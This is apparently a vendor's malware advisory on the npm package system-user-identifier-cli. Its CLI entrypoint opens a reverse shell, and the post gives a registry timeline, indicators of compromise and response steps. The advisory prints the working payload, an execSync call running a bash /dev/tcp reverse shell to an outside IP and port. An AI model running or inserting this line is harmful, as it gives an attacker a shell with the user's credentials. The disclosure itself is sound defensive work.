---
title: "system-user-identifier-cli: an npm identity helper that opens a reverse shell"
date: 2026-05-25
summary: "The npm package system-user-identifier-cli 2.0.0 presents itself as a small user-identification utility, but its CLI entrypoint executes a bash /dev/tcp reverse shell to 101.43.232.7:7777."
packageName: system-user-identifier-cli
ecosystem: npm
---

The package is 799 bytes. Two files, a placeholder author, a name that reads like a thousand other one-off `npx` utilities: `system-user-identifier-cli`. The manifest calls it "a simple npx tool to check system user identifier." The binary does check the user. Then it calls home.

After printing a greeting built from `os.userInfo().username` and `os.platform()`, the CLI hands control to bash:

```js
execSync('bash -i >& /dev/tcp/101.43.232.7/7777 0>&1', { encoding: 'utf-8' }).trim();
```

No staged download, no obfuscation, no install hook. The payload is the binary itself. Whoever runs the command — directly, through `npx`, through a teammate's copy-paste — gets a bash session wired to `101.43.232.7:7777`. The `catch` block prints a Chinese error claiming the `id` command failed; by then `id` is no longer what is running.

## Why this works

Two design choices make this more dangerous than the average install-time dropper. First, the package does the advertised work before it betrays you: a real username, a real platform string, printed in a friendly format. A developer scanning output sees a working tool, not a crash. Second, the trigger is the declared `bin`, not a `preinstall` script. Static scanners that flag lifecycle hooks see nothing here. The malicious surface is the thing the package exists to be run as.

The social engineering is the name. `system-user-identifier-cli` is the sort of phrase a hurried engineer types into a search bar and the sort an LLM might suggest. `npx` will fetch and execute it without leaving much of a trace.

## Traits observed

Cleave records what the artifact does, not what it claims. For this archive:

| Trait | Evidence |
| --- | --- |
| CLI execution surface | `bin.system-user-identifier-cli = index.js` |
| Process execution | `require('child_process').execSync(...)` |
| Victim fingerprinting | `os.userInfo().username`, `os.platform()` |
| Interactive reverse shell | `bash -i >& /dev/tcp/101.43.232.7/7777 0>&1` |
| C2 socket | `/dev/tcp/101.43.232.7/7777` |

Atomdrift labels the archive-level behavior `objectives/supply-chain/hidden-payload/exec::npm-cli-reverse-shell`. The distinction matters: this is not a string in a JavaScript file. It is a package whose declared entrypoint *is* the shell.

## Impact

The shell inherits the caller's privileges. On a workstation that means SSH agents, npm and GitHub tokens, browser secrets, cloud CLIs, and whatever the local checkouts contain. On a CI worker it means deploy keys, signing material, and the environment. The blast radius is narrower than an automatic `preinstall` compromise — execution has to happen — but anything that does run it should be treated as compromised until proven otherwise.

## Registry timeline

Eight versions in roughly three hours, all from a placeholder identity:

| Field | Value |
| --- | --- |
| Publisher | `ayoung299 <iamayoung666@gmail.com>` |
| Package created | `2026-05-25T03:39:14Z` |
| Version 2.0.0 published | `2026-05-25T03:43:59Z` |
| Latest observed | `7.0.1` at `06:35:37Z` |
| Versions published | 1.0.0, 2.0.0, 3.0.0, 4.0.0, 5.0.0, 6.0.0, 7.0.0, 7.0.1 |
| Downloads API | `package not found` |

The cadence is itself a signal. Throwaway names burned through fast, no download history, no second author — the package was published to be run once.

## Indicators

| Type | Value |
| --- | --- |
| Package | `system-user-identifier-cli@2.0.0` (npm) |
| Archive SHA-256 | `8b02bd641c856c510d26da46d003ac076dd754f8bab42143b676f9478ed5501e` |
| `index.js` SHA-256 | `bfb0cc6b95a52da2789e4436c8b45d7349dd79ecef358fa1c34b6294ad7eace3` |
| `package.json` SHA-256 | `28e8fcb5e9762c76f393dfc17d434a5089f107558df62db8246db8cb8217c7ce` |
| C2 endpoint | `101.43.232.7:7777` |

## Response

Search shell history, npm caches, CI logs, and egress telemetry for the package name and for outbound traffic to `101.43.232.7:7777`. Rotate npm, GitHub, SSH, cloud, and deployment credentials available to any user who ran the binary, from a host that did not. Registry metadata was read from `npm view system-user-identifier-cli@2.0.0 --json` and `https://registry.npmjs.org/system-user-identifier-cli`.
